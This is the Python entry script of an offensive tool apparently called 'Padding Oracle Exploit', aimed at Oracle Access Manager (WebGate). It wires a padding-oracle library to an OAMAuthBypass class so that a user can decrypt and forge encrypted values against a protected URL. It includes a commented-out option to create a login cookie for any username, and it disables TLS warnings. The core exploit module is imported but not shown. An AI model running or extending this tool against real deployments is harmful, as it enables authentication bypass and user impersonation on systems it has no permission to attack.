# -*- coding: utf-8 -*-
import argparse

import sys
import urllib3
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time
import logging
from lib.auth_bypass import OAMAuthBypass
from lib.constants import Constants


class App:
    def __init__(self, args):
        self._args = args

    def run(self):
        self._parse_args()
        self._print_banner()
        self._init_logger()
        auth_bypass = OAMAuthBypass(url=self._args.url)

        # if self._args.impersonate:
        #     auth_bypass.get_auth_cookie(self._args.impersonate)

        if self._args.encrypt:
            auth_bypass.encrypt(self._args.encrypt)

        if self._args.decrypt:
            auth_bypass.decrypt(self._args.decrypt)

    def _print_banner(self):
        banner = """                                                                                                                                                                             
                                                                                                                                                                                          
$$$$$$$\                 $$\       $$\ $$\                            $$$$$$\                               $$\                 $$$$$$$$\                     $$\           $$\   $$\     
$$  __$$\                $$ |      $$ |\__|                          $$  __$$\                              $$ |                $$  _____|                    $$ |          \__|  $$ |    
$$ |  $$ |$$$$$$\   $$$$$$$ | $$$$$$$ |$$\ $$$$$$$\   $$$$$$\        $$ /  $$ | $$$$$$\  $$$$$$\   $$$$$$$\ $$ | $$$$$$\        $$ |      $$\   $$\  $$$$$$\  $$ | $$$$$$\  $$\ $$$$$$\   
$$$$$$$  |\____$$\ $$  __$$ |$$  __$$ |$$ |$$  __$$\ $$  __$$\       $$ |  $$ |$$  __$$\ \____$$\ $$  _____|$$ |$$  __$$\       $$$$$\    \$$\ $$  |$$  __$$\ $$ |$$  __$$\ $$ |\_$$  _|  
$$  ____/ $$$$$$$ |$$ /  $$ |$$ /  $$ |$$ |$$ |  $$ |$$ /  $$ |      $$ |  $$ |$$ |  \__|$$$$$$$ |$$ /      $$ |$$$$$$$$ |      $$  __|    \$$$$  / $$ /  $$ |$$ |$$ /  $$ |$$ |  $$ |    
$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |      $$ |  $$ |$$ |     $$  __$$ |$$ |      $$ |$$   ____|      $$ |       $$  $$<  $$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$\ 
$$ |     \$$$$$$$ |\$$$$$$$ |\$$$$$$$ |$$ |$$ |  $$ |\$$$$$$$ |       $$$$$$  |$$ |     \$$$$$$$ |\$$$$$$$\ $$ |\$$$$$$$\       $$$$$$$$\ $$  /\$$\ $$$$$$$  |$$ |\$$$$$$  |$$ |  \$$$$  |
\__|      \_______| \_______| \_______|\__|\__|  \__| \____$$ |       \______/ \__|      \_______| \_______|\__| \_______|      \________|\__/  \__|$$  ____/ \__| \______/ \__|   \____/ 
                                                     $$\   $$ |                                                                                     $$ |                                  
                                                     \$$$$$$  |                                                                                     $$ |                                  
                                                      \______/                                                                                      \__|                                  
                                                                                                                                                                                          
                                                                                    ==============================
                                                                                    | Created by: Ayman ElSherif |
                                                                                    ==============================
        """
        print banner

    def _parse_args(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("url", help="URL of a resource protected by OAM (Oracle WebGate)")
        #parser.add_argument('-p', '--prefix', metavar='<prefix>',
        #                    help='Prefix: a valid base64 encoded encquery value with last block starts with a space character',
        #                    required=False)
        #parser.add_argument('-i', '--impersonate', metavar='<username>', help='Username to create a login cookie for',
        #                    required=False)
        parser.add_argument('-e', '--encrypt', metavar='<Clear-text>', help='Clear-text value to encrypt', required=False)
        parser.add_argument('-d', '--decrypt', metavar='<Cipher-text>', help='Cipher-text value to decrypt',
                            required=False)
        parser.add_argument('-v', '--verbose', help='Verbose output', action='store_true')

        # TODO validate args
        self._args = parser.parse_args()

    def _init_logger(self):
        logging.basicConfig(level=logging.INFO)
        self._logger = logging.getLogger(Constants.LOGGER_NAME)
        logging_level = logging.DEBUG if self._args.verbose else logging.INFO
        self._logger.setLevel(logging_level)

        console_formatter = logging.Formatter('[+] %(message)s')
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(console_formatter)
        console_handler.setLevel(logging_level)

        file_formatter = logging.Formatter(
            '[%(asctime)s] p%(process)s {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s')
        file_handler = logging.FileHandler('app.log')
        file_handler.setFormatter(file_formatter)
        file_handler.setLevel(logging_level)

        self._logger.addHandler(console_handler)
        self._logger.addHandler(file_handler)
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    import sys
    app = App(sys.argv)
    app.run()


if __name__ == '__main__':
    main()

